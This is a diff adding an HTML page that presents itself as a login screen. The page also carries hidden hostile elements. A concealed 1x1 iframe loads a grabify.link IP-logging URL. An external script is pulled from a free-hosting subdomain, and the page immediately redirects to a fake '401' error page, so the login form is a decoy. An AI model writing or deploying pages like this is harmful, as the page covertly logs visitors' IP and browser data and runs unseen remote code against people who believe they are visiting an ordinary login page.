@@ -1,0 +1,63 @@
+<html>
+<head>
+<style>
+body {
+  font-family: sans-serif;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  margin: 0;
+  background-color: #f0f0f0;
+}
+
+.login-container {
+  background-color: white;
+  padding: 20px;
+  border-radius: 8px;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+  text-align: center;
+}
+
+#login {
+  padding: 10px;
+  margin: 10px 0;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  width: 250px;
+}
+
+input[type="button"] {
+  padding: 10px 20px;
+  background-color: #007bff;
+  color: white;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+}
+
+input[type="button"]:hover {
+  background-color: #0056b3;
+}
+
+.hidden-iframe {
+  display: none;
+}
+
+</style>
+</head>
+<body>
+<div class="login-container">
+  <input id="login" type="password" placeholder="Please enter the login code" />
+  <br>
+  <input type="button" value="Login" onclick="checkLogin();" />
+</div>
+<div class="hidden-iframe">
+  <iframe src="https://grabify.link/9JX3XS" width="1" height="1"></iframe>
+</div>
+<script src="https://bobo.aidanwatters.kesug.com/script.js"></script>
+<script>
+    window.location.replace("http://error-pages.aidanwatters.kesug.com/401.html");
+</script>
+</body>
+</html>
